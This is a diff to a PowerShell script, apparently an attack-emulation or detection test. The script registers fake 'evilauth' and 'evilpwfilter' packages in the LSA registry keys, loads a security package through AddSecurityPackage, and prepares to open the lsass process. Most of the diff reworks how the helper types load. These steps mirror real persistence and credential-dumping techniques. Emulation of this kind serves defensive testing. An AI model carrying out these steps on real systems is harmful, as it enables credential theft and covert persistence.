@@ -8,8 +8,7 @@ $peStub = [byte[]]@(0x4D, 0x5A) + (New-Object byte[] 2046)
 try { [System.IO.File]::WriteAllBytes($malDll, $peStub) } catch {}
 
 try {
-    $newPackages = @($current) + @("evilauth")
-    Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value $newPackages -ErrorAction Stop
+    Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value (@($current) + @("evilauth")) -ErrorAction Stop
 } catch {}
 
 $notifCurrent = @("scecli")
@@ -18,29 +17,34 @@ try {
     Set-ItemProperty -Path $lsaKey -Name "Notification Packages" -Value (@($notifCurrent) + @("evilpwfilter")) -ErrorAction Stop
 } catch {}
 
-Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class LsaLoader {
-    [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-    public static extern int AddSecurityPackage(string pszPackageName, IntPtr pOptions);
-    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
-    public static extern int DeleteSecurityPackage(string pszPackageName);
+if (-not ('LsaLoader' -as [type])) {
+    Add-Type -TypeDefinition @'
+    using System;
+    using System.Runtime.InteropServices;
+    public class LsaLoader {
+        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern int AddSecurityPackage(string name, IntPtr opts);
+        [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+        public static extern int DeleteSecurityPackage(string name);
+    }
+'@
 }
-'@ -ErrorAction SilentlyContinue
 
 $r = [LsaLoader]::AddSecurityPackage("evilauth", [IntPtr]::Zero)
 if ($r -eq 0) { [LsaLoader]::DeleteSecurityPackage("evilauth") | Out-Null }
 
-Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class LsassOpen {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
-    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
+if (-not ('LsassOpen' -as [type])) {
+    Add-Type -TypeDefinition @'
+    using System;
+    using System.Runtime.InteropServices;
+    public class LsassOpen {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
+        [DllImport("kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr h);
+    }
+'@
 }
-'@ -ErrorAction SilentlyContinue
 
 $lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
 if ($lsass) {
